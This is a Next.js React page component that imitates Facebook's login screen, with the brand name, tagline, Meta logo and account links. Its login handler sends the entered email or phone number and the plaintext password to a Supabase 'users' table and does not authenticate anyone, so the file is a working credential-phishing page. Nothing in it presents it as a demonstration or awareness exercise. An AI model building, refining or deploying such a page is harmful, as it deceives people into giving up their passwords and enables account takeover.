"use client"

import Image from "next/image";
import View from "./image/view.png"
import Hide from "./image/hide.png"
import icon from "./image/communication.png"
import meta from "./image/meta.png"
import { supabase } from "./data/data"
import { useEffect, useState } from "react";

export default function Home() {

  const [email, setEmail] = useState("")
  const [pas, setPas] = useState("")
  const [see, setSee] = useState(false)
  const [eye, setEye] = useState(true)

  useEffect(() => {
    if(pas !== "") {
      setEye(false)
    } else {
      setEye(true)
    }
  }, [pas])

  const hide = () => {
    setSee(!see)
  }
  const view = () => {
    setSee(!see)
  }

  const login = async () => {
    if( email !== "" && pas !== "" ){
      const user = {
        name: email,
        password: pas,
      } 
      setEmail("")
      setPas("")
      await supabase.from("users").insert(user)
    }
  }


  return (
    <div className="w-4/6 mx-auto mt-52 sm:w-full sm:h-dvh sm:mt-0">
      <div className="flex">
        <div className="w-2/3 mr-4 sm:hidden">
          <p className="text-face font-bold text-6xl mb-3 mt-16">facebook</p>
          <p className="text-3xl ">Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div className="w-2/4 sm:w-full sm:h-dvh sm:flex sm:flex-col sm:justify-evenly">
          <div className="sm:flex sm:justify-center sm:w-full hidden">
            <Image src={icon} alt="icon" className="w-20 h-20" />
          </div>
          <div className="flex flex-col relative bg-white p-4 rounded-lg h-fit items-center shadow-xl sm:bg-transparent sm:shadow-none sm:w-full">
            <input 
              type="text" 
              className="p-2 text-xl my-2 mb-4 border w-full sm:rounded-xl" 
              placeholder="Email address or phone number" 
              onChange={(e) => setEmail(e.target.value)}
              value={email}
            />
            {see ? 
              <Image 
                src={View} 
                alt="view" 
                className={`absolute right-8 top-[100px] cursor-pointer ${eye && 'hidden'}`}  
                onClick={hide}
              />
            :
              <Image 
                src={Hide}
                alt="hide" 
                className={`absolute right-8 top-[100px] cursor-pointer ${eye && 'hidden'}`} 
                onClick={view}
              />
            }
            <input 
              type={see ? "text" : "password" }
              className="p-2 text-xl my-2 mb-4 border w-full sm:rounded-lg" 
              placeholder="password"
              onChange={(e) => setPas(e.target.value)}
              value={pas}
            />
            <button onClick={login} className="bg-log font-bold text-xl text-white p-3 rounded-lg hover:bg-blue-500 w-full sm:p-2 sm:rounded-full sm:font-normal" >Log In</button>
            <p className="text-blue-500 cursor-pointer hover:underline mt-3 mb-5 sm:text-black">forgotten password?</p>
            <hr className="w-full sm:hidden" />
            <button className="bg-create p-2 text-white font-bold rounded-lg text-xl mt-6 mb-2 hover:bg-green-600 sm:w-full sm:text-log sm:bg-transparent sm:border sm:border-log sm:rounded-full sm:font-normal">Create new account</button>
          </div> 
          <p className="mx-auto w-fit mt-6 sm:hidden sm:float-"> <span className="font-bold hover:underline cursor-pointer">Create a Page</span> for a celebrity, brand or business.</p>
          <div className="hidden sm:flex sm:w-full sm:justify-center">
            <Image src={meta} alt="meta" className="w-8 h-8"/>
            <p className="font-bold text-lg mx-2">Meta</p>
          </div>
        </div>
      </div>
    </div>
  );
}
